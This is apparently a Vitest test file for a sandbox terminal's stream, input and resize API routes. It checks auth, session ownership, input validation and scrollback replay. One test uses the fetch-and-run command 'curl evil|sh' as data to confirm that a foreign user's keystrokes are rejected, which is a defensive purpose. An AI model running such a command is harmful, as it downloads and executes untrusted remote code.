/**
 * The three sandbox-terminal routes (#79): stream (SSE out), input and resize
 * (control in). The PtyManager is mocked — these cases are about the HTTP
 * surface the xterm client talks to: auth, ownership (a foreign session is
 * indistinguishable from an absent one), argument validation, the scrollback
 * replay that repaints a re-mounted tab, and unsubscribing when the tab closes.
 *
 * The ownership *resolvers* are mocked; the gate logic on top of them
 * (`lib/stash/http.server.ts` — claim on stream, verify on input/resize, 404
 * shape) runs for real.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'

vi.mock('../../../lib/harness-patterns/assert.server', () => ({
  assertServerOnImport: vi.fn(),
  assertServer: vi.fn(),
}))

const userOwnsSession = vi.fn<(sid: string, uid: string) => Promise<boolean>>(async () => true)
const claimSessionOwnership = vi.fn<(sid: string, uid: string) => Promise<boolean>>(
  async () => true,
)
vi.mock('../../../lib/stash/ownership.server', () => ({
  userOwnsSession: (...a: unknown[]) => userOwnsSession(...(a as [string, string])),
  claimSessionOwnership: (...a: unknown[]) => claimSessionOwnership(...(a as [string, string])),
}))

const ensure = vi.fn<(sid: string, opts?: { syncWorkspace?: boolean }) => Promise<void>>(
  async () => {},
)
const getScrollback = vi.fn<(sid: string) => string | undefined>(() => undefined)
const unsubscribe = vi.fn()
const subscribe = vi.fn<(sid: string, send: (chunk: string) => void) => () => void>(
  () => unsubscribe,
)
const write = vi.fn()
const resize = vi.fn()
vi.mock('../../../lib/sandbox/pty-manager.server', () => ({
  ptyManager: {
    ensure: (...a: unknown[]) => ensure(...(a as [never, never])),
    getScrollback: (...a: unknown[]) => getScrollback(...(a as [never])),
    subscribe: (...a: unknown[]) => subscribe(...(a as [never, never])),
    write: (...a: unknown[]) => write(...a),
    resize: (...a: unknown[]) => resize(...a),
  },
}))

const agentUsesSyncWorkspace = vi.fn<() => Promise<boolean>>(async () => false)
vi.mock('../../../lib/harness-client/registry.server', () => ({
  agentUsesSyncWorkspace: () => agentUsesSyncWorkspace(),
}))

const getAuthenticatedUser = vi.fn<() => Promise<{ id: string }>>()
vi.mock('../../../lib/auth/server', () => ({ getAuthenticatedUser }))
let bypass = false
vi.mock('../../../lib/auth/dev-bypass', () => ({
  isBypassEnabled: () => bypass,
  BYPASS_USER: { id: 'bypass-user', email: 'bypass@example.com' },
}))

const stream = await import('../../../routes/api/sandbox/pty/stream')
const input = await import('../../../routes/api/sandbox/pty/input')
const resizeRoute = await import('../../../routes/api/sandbox/pty/resize')

function get(url: string, signal?: AbortSignal) {
  return { params: {}, request: new Request(url, signal ? { signal } : {}) } as never
}

function post(url: string, body: unknown, raw = false) {
  return {
    params: {},
    request: new Request(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: raw ? (body as string) : JSON.stringify(body),
    }),
  } as never
}

/** Read the SSE frames a stream response has produced so far. */
async function firstFrames(res: Response): Promise<string[]> {
  const reader = res.body!.getReader()
  const { value } = await reader.read()
  reader.releaseLock()
  return new TextDecoder()
    .decode(value)
    .split('\n\n')
    .filter(Boolean)
    .map((f) => JSON.parse(f.slice(6)) as string)
}

beforeEach(() => {
  vi.clearAllMocks()
  bypass = false
  getAuthenticatedUser.mockResolvedValue({ id: 'user-1' })
  ensure.mockResolvedValue(undefined)
  getScrollback.mockReturnValue(undefined)
  subscribe.mockReturnValue(unsubscribe)
  agentUsesSyncWorkspace.mockResolvedValue(false)
  userOwnsSession.mockResolvedValue(true)
  claimSessionOwnership.mockResolvedValue(true)
})

describe('GET /api/sandbox/pty/stream', () => {
  it('400s without a sessionId, before authenticating or booting a PTY', async () => {
    const res = await stream.GET(get('http://x/api/sandbox/pty/stream'))
    expect(res.status).toBe(400)
    expect(getAuthenticatedUser).not.toHaveBeenCalled()
    expect(ensure).not.toHaveBeenCalled()
  })

  it('401s without a session, and never boots a PTY', async () => {
    getAuthenticatedUser.mockRejectedValue(new Error('Authentication required'))
    const res = await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=s1'))
    expect(res.status).toBe(401)
    expect(await res.json()).toEqual({ error: 'Authentication required' })
    expect(ensure).not.toHaveBeenCalled()
  })

  it("404s another user's session without booting or subscribing to its PTY", async () => {
    claimSessionOwnership.mockResolvedValue(false) // held by someone else
    const res = await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=s1'))
    expect(res.status).toBe(404)
    expect(claimSessionOwnership).toHaveBeenCalledWith('s1', 'user-1')
    expect(ensure).not.toHaveBeenCalled()
    expect(subscribe).not.toHaveBeenCalled()
    expect(getScrollback).not.toHaveBeenCalled()
  })

  it('claims an unclaimed session for the caller before booting its PTY', async () => {
    const res = await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=fresh'))
    expect(res.status).toBe(200)
    expect(claimSessionOwnership).toHaveBeenCalledWith('fresh', 'user-1')
    expect(ensure).toHaveBeenCalledWith('fresh', { syncWorkspace: false })
  })

  it('500s with the reason when the sandbox terminal fails to start', async () => {
    ensure.mockRejectedValue(new Error('docker not running'))
    const res = await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=s1'))
    expect(res.status).toBe(500)
    expect(await res.text()).toMatch(/docker not running/)
  })

  it('replays the current scrollback so a re-mounted tab repaints', async () => {
    getScrollback.mockReturnValue('$ ls\nfile.txt\n')
    const res = await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=s1'))

    expect(res.headers.get('Content-Type')).toBe('text/event-stream')
    expect(await firstFrames(res)).toEqual(['$ ls\nfile.txt\n'])
  })

  it('streams live PTY output as JSON-encoded frames (control chars survive)', async () => {
    const res = await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=s1'))
    const send = subscribe.mock.calls[0][1]
    send('[2Jhello\n')

    expect(await firstFrames(res)).toEqual(['[2Jhello\n'])
  })

  it('hydrates the workspace only for an agent that syncs one', async () => {
    await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=s1'))
    expect(ensure).toHaveBeenCalledWith('s1', { syncWorkspace: false })

    agentUsesSyncWorkspace.mockResolvedValue(true)
    await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=s1&agentId=sandbox'))
    expect(ensure).toHaveBeenLastCalledWith('s1', { syncWorkspace: true })
  })

  it('still opens the terminal when the capability lookup fails', async () => {
    agentUsesSyncWorkspace.mockRejectedValue(new Error('registry hiccup'))
    const res = await stream.GET(
      get('http://x/api/sandbox/pty/stream?sessionId=s1&agentId=sandbox'),
    )
    expect(res.status).toBe(200)
    expect(ensure).toHaveBeenCalledWith('s1', { syncWorkspace: false })
  })

  it('unsubscribes from the PTY when the client disconnects', async () => {
    const ac = new AbortController()
    await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=s1', ac.signal))
    expect(unsubscribe).not.toHaveBeenCalled()

    ac.abort()
    expect(unsubscribe).toHaveBeenCalledTimes(1)
  })

  it('skips the auth check under dev-bypass, but still gates on ownership', async () => {
    bypass = true
    const res = await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=s1'))
    expect(res.status).toBe(200)
    expect(getAuthenticatedUser).not.toHaveBeenCalled()
    expect(claimSessionOwnership).toHaveBeenCalledWith('s1', 'bypass-user')
  })
})

describe('POST /api/sandbox/pty/input', () => {
  it('401s without a session, and writes nothing', async () => {
    getAuthenticatedUser.mockRejectedValue(new Error('Authentication required'))
    const res = await input.POST(post('http://x/i', { sessionId: 's1', data: 'ls\n' }))
    expect(res.status).toBe(401)
    expect(write).not.toHaveBeenCalled()
  })

  it('writes the keystrokes verbatim and 204s', async () => {
    const res = await input.POST(post('http://x/i', { sessionId: 's1', data: '' }))
    expect(res.status).toBe(204)
    expect(write).toHaveBeenCalledWith('s1', '')
  })

  it('400s a malformed body, a missing sessionId, or non-string data', async () => {
    expect((await input.POST(post('http://x/i', 'not json', true))).status).toBe(400)
    expect((await input.POST(post('http://x/i', { data: 'x' }))).status).toBe(400)
    expect((await input.POST(post('http://x/i', { sessionId: 's1', data: 42 }))).status).toBe(400)
    expect(write).not.toHaveBeenCalled()
  })

  it('accepts an empty string as data — that is a real keystroke payload', async () => {
    expect((await input.POST(post('http://x/i', { sessionId: 's1', data: '' }))).status).toBe(204)
    expect(write).toHaveBeenCalledWith('s1', '')
  })

  it("404s another user's session and writes no keystrokes into its shell", async () => {
    userOwnsSession.mockResolvedValue(false)
    const res = await input.POST(post('http://x/i', { sessionId: 's1', data: 'curl evil|sh\n' }))
    expect(res.status).toBe(404)
    expect(userOwnsSession).toHaveBeenCalledWith('s1', 'user-1')
    expect(write).not.toHaveBeenCalled()
  })
})

describe('POST /api/sandbox/pty/resize', () => {
  it('401s without a session, and resizes nothing', async () => {
    getAuthenticatedUser.mockRejectedValue(new Error('Authentication required'))
    const res = await resizeRoute.POST(post('http://x/r', { sessionId: 's1', cols: 80, rows: 24 }))
    expect(res.status).toBe(401)
    expect(resize).not.toHaveBeenCalled()
  })

  it('forwards the dimensions to the PTY and 204s', async () => {
    const res = await resizeRoute.POST(post('http://x/r', { sessionId: 's1', cols: 120, rows: 40 }))
    expect(res.status).toBe(204)
    expect(resize).toHaveBeenCalledWith('s1', 120, 40)
  })

  it('400s a malformed body or non-numeric dimensions', async () => {
    expect((await resizeRoute.POST(post('http://x/r', 'not json', true))).status).toBe(400)
    expect((await resizeRoute.POST(post('http://x/r', { sessionId: 's1', cols: 80 }))).status).toBe(
      400,
    )
    expect(
      (await resizeRoute.POST(post('http://x/r', { sessionId: 's1', cols: '80', rows: '24' })))
        .status,
    ).toBe(400)
    expect(resize).not.toHaveBeenCalled()
  })

  it("404s another user's session and never touches its PTY", async () => {
    userOwnsSession.mockResolvedValue(false)
    const res = await resizeRoute.POST(post('http://x/r', { sessionId: 's1', cols: 80, rows: 24 }))
    expect(res.status).toBe(404)
    expect(userOwnsSession).toHaveBeenCalledWith('s1', 'user-1')
    expect(resize).not.toHaveBeenCalled()
  })
})

describe('ownership 404s are indistinguishable from an absent session', () => {
  // `userOwnsSession(unknown)` resolves null-owner → false, the same value a
  // foreign session yields, so both go down one code path. Pin that the
  // response bodies are byte-identical anyway, per route, so a refactor that
  // splits the two cases can't quietly start leaking which ids exist.
  it('input, resize and stream return one identical 404 for both cases', async () => {
    userOwnsSession.mockResolvedValue(false)
    claimSessionOwnership.mockResolvedValue(false)
    const foreign = [
      await input.POST(post('http://x/i', { sessionId: 'foreign', data: 'x' })),
      await resizeRoute.POST(post('http://x/r', { sessionId: 'foreign', cols: 80, rows: 24 })),
      await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=foreign')),
    ]
    const unknown = [
      await input.POST(post('http://x/i', { sessionId: 'nope', data: 'x' })),
      await resizeRoute.POST(post('http://x/r', { sessionId: 'nope', cols: 80, rows: 24 })),
      await stream.GET(get('http://x/api/sandbox/pty/stream?sessionId=nope')),
    ]
    for (let i = 0; i < foreign.length; i++) {
      expect(foreign[i].status).toBe(404)
      expect(unknown[i].status).toBe(404)
      expect(await foreign[i].text()).toBe(await unknown[i].text())
    }
  })
})
